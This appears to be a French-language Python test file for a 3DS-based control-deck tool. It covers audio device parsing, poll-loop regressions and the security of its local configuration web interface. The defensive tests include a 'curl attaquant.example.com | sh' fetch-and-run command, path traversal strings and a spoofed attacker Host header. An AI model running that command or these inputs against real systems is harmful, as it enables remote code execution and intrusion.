        for winrt_type in (
            "GlobalSystemMediaTransportControlsSessionManager",
            "GlobalSystemMediaTransportControlsSessionMediaProperties",
            "IRandomAccessStreamWithContentType",
        ):
            self.assertIn(winrt_type, script)

    def test_sorties_audio_du_registre_sont_parsees(self):
        from deck3ds.platforms.windows import WindowsPlatform

        class Shell:
            def run(self, _script, timeout=0):
                return "id-1\tCasque USB\nid-2\tÉcran HDMI"

        platform = WindowsPlatform.__new__(WindowsPlatform)
        platform._shell = Shell()

        self.assertEqual(
            platform._audio_devices(),
            [("id-1", "Casque USB"), ("id-2", "Écran HDMI")],
        )


# --- Boucle de collecte --------------------------------------------------------


class TestPollLoop(unittest.IsolatedAsyncioTestCase):
    """Régression : la boucle mourait au démarrage, sans le moindre message."""

    async def test_signal_de_rafraichissement_utilisable_apres_construction(self):
        """Le serveur peut être construit hors de toute boucle d'événements.

        `asyncio.Event()` se liait jusqu'à Python 3.9 à la boucle courante lors
        de sa construction. Le serveur étant instancié avant `asyncio.run`, le
        premier `wait()` levait « attached to a different loop » et la collecte
        s'arrêtait : plus de rechargement à chaud, plus d'état rafraîchi, alors
        que l'agent continuait de répondre aux appuis.
        """
        # Construction dans un fil sans boucle, comme le fait le point d'entrée.
        created: list[Server] = []

        def build() -> None:
            loaded = config_module.parse(minimal_config())
            created.append(Server(loaded, FakePlatform()))

        thread = threading.Thread(target=build)
        thread.start()
        thread.join()

        server = created[0]

        # L'attente doit aboutir dans la boucle courante, différente de celle
        # qui existait — ou pas — à la construction.
        server._wake().set()
        await asyncio.wait_for(server._wake().wait(), timeout=1.0)
        self.assertTrue(server._wake().is_set())

    async def test_panne_de_collecte_journalisee(self):
        """Une boucle qui meurt doit le dire, au lieu de disparaître."""
        loaded = config_module.parse(minimal_config())
        server = Server(loaded, FakePlatform())

        async def exploser() -> None:
            raise RuntimeError("panne simulee")

        server._poll_forever = exploser

        with self.assertRaises(RuntimeError):
            await server._poll_loop()

        journal = "\n".join(server.recent_logs())
        self.assertIn("Collecte interrompue", journal)
        self.assertIn("panne simulee", journal)


# --- Interface de configuration ------------------------------------------------


class TestUiSecurity(unittest.IsolatedAsyncioTestCase):
    """L'interface écrit des commandes exécutables : ces gardes sont vitaux."""

    async def asyncSetUp(self):
        from deck3ds.ui.api import Api
        from deck3ds.ui.http import UiServer

        directory = Path(tempfile.mkdtemp())
        self.path = directory / "config.json"
        raw = minimal_config()
        raw["scripts"] = {"sauvegarde": ["/bin/echo", "bonjour"]}
        raw["pages"][0]["buttons"].append(
            {
                "id": "s1",
                "slot": 1,
                "label": "Script",
                "action": {"type": "script.run", "script": "sauvegarde"},
            }
        )
        self.path.write_text(json.dumps(raw), encoding="utf-8")

        loaded = config_module.load(self.path)
        self.server = Server(loaded, FakePlatform(), config_path=self.path)

        api = Api(self.server)
        self.ui = UiServer(api.routes(), port=0, log=lambda message: None)
        await self.ui.start()
        self.port = self.ui._server.sockets[0].getsockname()[1]

    async def asyncTearDown(self):
        await self.ui.close()

    async def request(
        self,
        method: str,
        target: str,
        body: object = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, dict]:
        """Émet une requête brute et retourne (code, charge décodée)."""
        reader, writer = await asyncio.open_connection("127.0.0.1", self.port)

        lines = [f"{method} {target} HTTP/1.1"]
        merged = {"Host": "127.0.0.1"}
        merged.update(headers or {})

        payload = b""
        if body is not None:
            payload = json.dumps(body).encode("utf-8")
            merged["Content-Type"] = "application/json"
            merged["Content-Length"] = str(len(payload))

        for name, value in merged.items():
            lines.append(f"{name}: {value}")

        writer.write(("\r\n".join(lines) + "\r\n\r\n").encode("latin-1") + payload)
        await writer.drain()

        raw = await reader.read()
        writer.close()

        head, _, tail = raw.partition(b"\r\n\r\n")
        status = int(head.split(b" ")[1])

        try:
            return status, json.loads(tail.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            return status, {}

    def authorised(self) -> dict[str, str]:
        return {"X-Deck3DS-Token": self.ui.token}

    async def test_ecoute_uniquement_en_local(self):
        """L'éditeur ne doit jamais être joignable depuis le réseau."""
        host = self.ui._server.sockets[0].getsockname()[0]
        self.assertEqual(host, "127.0.0.1")

    async def test_sans_jeton_refuse(self):
        status, _ = await self.request("GET", "/api/config")
        self.assertEqual(status, 403)

    async def test_jeton_invalide_refuse(self):
        status, _ = await self.request(
            "GET", "/api/config", headers={"X-Deck3DS-Token": "faux"}
        )
        self.assertEqual(status, 403)

    async def test_jeton_dans_l_url_accepte(self):
        """Le lien affiché au démarrage doit fonctionner tel quel."""
        status, _ = await self.request("GET", f"/api/config?token={self.ui.token}")
        self.assertEqual(status, 200)

    async def test_hote_etranger_refuse(self):
        """Ferme la réattribution de nom de domaine vers 127.0.0.1."""
        status, _ = await self.request(
            "GET",
            "/api/config",
            headers={"Host": "attaquant.example.com", **self.authorised()},
        )
        self.assertEqual(status, 403)

    async def test_origine_etrangere_refusee_en_ecriture(self):
        status, _ = await self.request(
            "PUT",
            "/api/config",
            body=config_module.to_raw(self.server.config),
            headers={"Origin": "http://attaquant.example.com", **self.authorised()},
        )
        self.assertEqual(status, 403)

    async def test_traversee_de_repertoire_refusee(self):
        for target in ("/../config.json", "/..%2f..%2fconfig.json"):
            status, _ = await self.request("GET", target)
            self.assertEqual(status, 403, target)

    async def test_scripts_non_modifiables(self):
        """Le point critique : aucune commande ne doit entrer par le réseau.

        `scripts` est la seule section décrivant des programmes à exécuter.
        L'accepter depuis un navigateur ferait de l'interface un moyen
        d'exécuter du code arbitraire.
        """
        candidate = config_module.to_raw(self.server.config)
        candidate["scripts"] = {
            "sauvegarde": ["/bin/sh", "-c", "curl attaquant.example.com | sh"]
        }

        status, payload = await self.request(
            "PUT", "/api/config", body=candidate, headers=self.authorised()
        )
        self.assertEqual(status, 200)

        # Le fichier doit conserver la commande d'origine.
        written = json.loads(self.path.read_text(encoding="utf-8"))
        self.assertEqual(written["scripts"], {"sauvegarde": ["/bin/echo", "bonjour"]})
        self.assertEqual(payload["config"]["scripts"], {"sauvegarde": ["/bin/echo", "bonjour"]})

    async def test_methode_inconnue_refusee(self):
        status, _ = await self.request(
            "DELETE", "/api/config", headers=self.authorised()
        )
        self.assertEqual(status, 405)

    async def test_route_inconnue(self):
        status, _ = await self.request(
            "GET", "/api/inexistant", headers=self.authorised()
        )
        self.assertEqual(status, 404)

    async def test_jeton_accepte_en_entete_seul(self):
        """La page rechargée n'a plus le jeton dans l'URL, seulement en en-tête.

        Régression : l'interface effaçait le jeton de la barre d'adresse sans le
        conserver, si bien que le premier rechargement le perdait et la page se
        déclarait orpheline. Elle le garde désormais dans `sessionStorage` et le
        présente en en-tête ; ce chemin doit donc rester valide sans aucun
        paramètre d'URL.
        """
        status, _ = await self.request(
            "GET", "/api/state", headers={"X-Deck3DS-Token": self.ui.token}
        )
        self.assertEqual(status, 200)

    async def test_interface_conserve_le_jeton_entre_rechargements(self):
        """Le script servi doit mémoriser le jeton, sinon F5 casse la page.

        Vérifié sur la ressource réellement servie : le défaut se situait
        entièrement côté navigateur et aucun test de l'API ne pouvait le voir.
        """
        status, _ = await self.request("GET", "/app.js")
        self.assertEqual(status, 200)

        script = (self.ui.static_root / "app.js").read_text(encoding="utf-8")
        self.assertIn("sessionStorage", script)
        # Le jeton doit être mémorisé avant d'être retiré de l'URL, sans quoi
        # l'effacement le perdrait définitivement.
        self.assertLess(
            script.index("sessionStorage.setItem"),
            script.index("history.replaceState"),
            "le jeton doit etre memorise avant d'etre retire de l'URL",
        )


class TestUiApi(unittest.IsolatedAsyncioTestCase):
    """Contrat de l'interface, hors sécurité."""

    async def asyncSetUp(self):
        from deck3ds.ui.api import Api

        directory = Path(tempfile.mkdtemp())
        self.path = directory / "config.json"
        self.path.write_text(json.dumps(minimal_config()), encoding="utf-8")

        loaded = config_module.load(self.path)
        self.server = Server(loaded, FakePlatform(), config_path=self.path)
        self.api = Api(self.server)

    def fake_request(self, body: object = None):
        """Requête minimale, sans passer par la couche HTTP."""
        from deck3ds.ui.http import Request

        payload = b"" if body is None else json.dumps(body).encode("utf-8")
        return Request("GET", "/api/x", {}, payload)

    async def test_aller_retour_sans_perte(self):
        """Lire puis réenregistrer ne doit rien altérer, hors révision."""
        response = await self.api.get_config(self.fake_request())
        before = json.loads(response.body)["config"]

        await self.api.put_config(self.fake_request(before))

        after = json.loads(self.path.read_text(encoding="utf-8"))
        self.assertEqual(after["revision"], before["revision"] + 1)

        before.pop("revision")
        after.pop("revision")
        self.assertEqual(after, before)

    async def test_revision_incrementee(self):
        """Sans cela, la console garderait sa mise en page en cache."""
        raw = config_module.to_raw(self.server.config)
        raw["revision"] = 7
        await self.api.put_config(self.fake_request(raw))
        self.assertEqual(
            json.loads(self.path.read_text(encoding="utf-8"))["revision"], 8
        )

    async def test_configuration_invalide_refusee_et_fichier_intact(self):
        """Une erreur ne doit jamais corrompre le fichier en place."""
        from deck3ds.ui.http import HttpError

        original = self.path.read_text(encoding="utf-8")
        raw = config_module.to_raw(self.server.config)
        raw["pages"][0]["buttons"][0]["action"] = "action.inventee"

        with self.assertRaises(HttpError) as caught:
            await self.api.put_config(self.fake_request(raw))

        self.assertEqual(caught.exception.status, 422)
        self.assertIn("action inconnue", caught.exception.message)
        self.assertEqual(self.path.read_text(encoding="utf-8"), original)

    async def test_validation_sans_ecriture(self):
        original = self.path.read_text(encoding="utf-8")
        raw = config_module.to_raw(self.server.config)

        response = await self.api.validate_config(self.fake_request(raw))
        self.assertTrue(json.loads(response.body)["valid"])
        self.assertEqual(self.path.read_text(encoding="utf-8"), original)

    async def test_schema_signale_les_actions_indisponibles(self):
        """Cœur de l'avertissement : une action non supportée doit être marquée."""
        from deck3ds.ui.api import build_schema
        from deck3ds.platforms.base import Capabilities

        schema = build_schema(Capabilities(volume=True))
        by_kind = {item["kind"]: item for item in schema["actions"]}

        self.assertTrue(by_kind["volume.up"]["supported"])
        self.assertFalse(by_kind["window.focus"]["supported"])
        # Une action traitée par la console reste disponible partout.
        self.assertTrue(by_kind["settings.open"]["supported"])
        self.assertTrue(by_kind["noop"]["supported"])

    async def test_schema_decrit_les_actions_obs(self):
        from deck3ds.ui.api import build_schema
        from deck3ds.platforms.base import Capabilities

        schema = build_schema(Capabilities(), obs_enabled=True)
        by_kind = {item["kind"]: item for item in schema["actions"]}

        self.assertTrue(by_kind["obs.scene.set"]["supported"])
        self.assertEqual(
            [argument["name"] for argument in by_kind["obs.source.toggle"]["arguments"]],
            ["scene", "source"],
        )

    async def test_schema_expose_les_limites_de_la_console(self):
        """L'interface doit refuser ce que le matériel ne peut afficher."""
        from deck3ds.ui.api import build_schema
        from deck3ds.platforms.base import Capabilities

        limits = build_schema(Capabilities())["limits"]
        self.assertEqual(limits["buttons_per_page"], config_module.MAX_BUTTONS_PER_PAGE)
        self.assertEqual(limits["pages"], config_module.MAX_PAGES)

    async def test_etat_expose_capacites_et_journal(self):
        self.server.log("ligne de test")
        response = await self.api.get_state(self.fake_request())
        payload = json.loads(response.body)

        self.assertIn("capabilities", payload)
        self.assertIn("ligne de test", "\n".join(payload["logs"]))
        self.assertEqual(payload["platform"], self.server.platform.name)

    async def test_journal_borne(self):
        """Une exécution de plusieurs jours ne doit pas consommer la mémoire."""
        for index in range(1000):
            self.server.log(f"ligne {index}")
        self.assertLessEqual(len(self.server.recent_logs()), 300)


if __name__ == "__main__":
    unittest.main(verbosity=2)
